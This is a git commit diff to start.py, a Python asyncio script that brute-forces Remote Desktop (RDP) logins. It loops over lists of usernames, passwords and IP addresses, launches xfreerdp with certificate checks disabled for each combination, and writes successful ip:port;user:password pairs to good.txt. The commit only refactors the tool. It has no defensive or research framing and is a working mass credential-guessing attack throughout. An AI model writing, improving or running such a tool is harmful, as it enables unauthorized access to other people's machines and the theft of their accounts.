bdced4bc0b7f90050b9e654a19fb92d40cd8cfbc
Dev <Dev>
2019-07-22 13:21:38 +0200

    Fixes

--- start.py
+++ start.py
@@ -1,11 +1,10 @@
-# -*- coding: utf-8 -*-
-
 import asyncio
-from async_timeout import timeout as ftime
-from aiofiles import open as afile
-from platform import system as sys_ver
 from asyncio import create_subprocess_shell as run
 from asyncio.subprocess import DEVNULL
+from platform import system as sys_ver
+
+from aiofiles import open as afile
+from async_timeout import timeout as ftime
 
 
 # OS Detect
@@ -15,36 +14,33 @@ else:
     fr_name = 'xfreerdp'
 
 
-async def connect(ip, user, password):
-    global good, finished
+async def connect(ip: str, user: str, password: str) -> str:
+    r_agr = f"{fr_name} /v:{ip} /port:{PORT} /u:'{user}' " + \
+            f"/p:'{password}' /cert-ignore +auth-only " + \
+            '+compression /sec:nla'
+
+    a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)
 
     try:
-        r_agr = f"{fr_name} /v:{ip} /port:{port} /u:'{user}' " + \
-                    f"/p:'{password}' /cert-ignore +auth-only " + \
-                    '+compression /sec:nla'
-
-        a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)
-
-        async with ftime(timeout):
+        async with ftime(TIMEOUT):
             await a.communicate()
 
         assert a.returncode == 0
 
-        good += 1
-        rez = f'{ip}:{port};{user}:{password}\n'
+        rez = f'{ip}:{PORT};{user}:{password}\n'
 
         async with afile(f'good.txt', 'a', encoding='utf-8',
                          errors='ignore') as f:
             await f.write(rez)
-    except:
+
+        return 'g'
+    except Exception:
         await a.kill()
-    finally:
-        finished += 1
-        print(f'Good: {good}; Done: {finished}', end="\r")
-        return
 
 
-async def start():
+async def start() -> None:
+    good = 0
+    total = 0
     tasks = []
 
     async with afile('data/users.txt', errors="ignore",
@@ -56,17 +52,20 @@ async def start():
                     async with afile('data/ip.txt', errors="ignore",
                                      encoding="utf-8") as ips:
                         async for ip in ips:
-                            task = asyncio.create_task(
-                                connect(
-                                    ip.replace('\n', ''),
-                                    user.replace('\n', ''),
-                                    passw.replace('\n', '')
-                                )
-                            )
-                            tasks.append(task)
+                            tasks.append(asyncio.create_task(connect(
+                                ip.strip(),
+                                user.strip(),
+                                passw.strip()
+                            )))
 
-                            if len(tasks) >= threads:
-                                await asyncio.gather(*tasks)
+                            if len(tasks) == THREADS:
+                                for rez in await asyncio.gather(*tasks):
+                                    if rez:
+                                        good += 1
+
+                                    total += 1
+
+                                print(f'Good: {good}; Total: {total}', end='\r')
                                 tasks = []
 
     if len(tasks) != 0:
@@ -74,10 +73,10 @@ async def start():
 
 
 if __name__ == "__main__":
-    good = 0
-    finished = 0
-    threads = int(input('Threads: '))
-    timeout = int(input('Timeout: '))
-    port = int(input('Port: ') or 3389)
+    THREADS = int(input('Threads: '))
+    TIMEOUT = int(input('Timeout: '))
+    PORT = int(input('Port: ') or 3389)
 
-    asyncio.run(start())
+    loop = asyncio.new_event_loop()
+    loop.run_until_complete(start())
+    loop.close()
